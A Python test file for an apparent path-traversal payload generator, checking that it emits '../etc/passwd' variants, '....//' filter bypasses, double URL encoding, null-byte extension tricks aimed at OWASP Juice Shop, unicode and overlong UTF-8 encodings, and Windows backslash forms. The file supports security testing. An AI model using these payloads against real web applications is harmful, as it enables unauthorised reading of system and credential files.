from traverse.payloads import generate_payloads

def test_includes_basic_traversal():
    p = generate_payloads("/etc/passwd", depth=4)
    assert "../../../etc/passwd" in p

def test_includes_absolute_path():
    assert "/etc/passwd" in generate_payloads("/etc/passwd")

def test_includes_nonrecursive():
    assert any(s.startswith("....//") for s in generate_payloads("/etc/passwd"))

def test_includes_single_and_double_encoding():
    p = generate_payloads("/etc/passwd")
    assert any("%2e%2e%2f" in s for s in p)
    assert any("%252e%252e%252f" in s for s in p)

def test_no_triple_encoding():
    assert all("%25252e" not in s for s in generate_payloads("/etc/passwd"))

def test_includes_leading_path_prefix():
    assert any(s.startswith("/var/www/images/") and s.endswith("etc/passwd")
               for s in generate_payloads("/etc/passwd"))

def test_includes_null_byte_extension():
    assert any("%00." in s for s in generate_payloads("/etc/passwd"))

def test_results_are_deduplicated():
    p = generate_payloads("/etc/passwd")
    assert len(p) == len(set(p))

def test_os_filter_windows_uses_backslash():
    p = generate_payloads("/windows/win.ini", os_filter="windows")
    assert any("\\" in s for s in p)


def test_double_encoded_null_byte_with_md_extension():
    # Juice Shop poison null byte: %2500 (the % is itself encoded) + .md
    p = generate_payloads("/ftp/package.json.bak", depth=1, null_exts=[".md"])
    assert any("%2500.md" in x for x in p)


def test_null_byte_no_traversal_variant_for_path_segment():
    # /ftp/FUZZ style: target-file only, no ../ needed
    p = generate_payloads("package.json.bak", depth=1, null_exts=[".md"])
    assert "package.json.bak%2500.md" in p


def test_single_null_byte_still_present():
    p = generate_payloads("/etc/passwd", depth=1)
    assert any("%00.png" in x for x in p)


def test_includes_16bit_unicode():
    p = generate_payloads("/etc/passwd", depth=1)
    assert any("%u002e%u002e%u2215" in x for x in p)   # ../


def test_includes_utf8_overlong():
    p = generate_payloads("/etc/passwd", depth=1)
    assert any("%c0%ae%c0%ae%c0%af" in x for x in p)    # ../
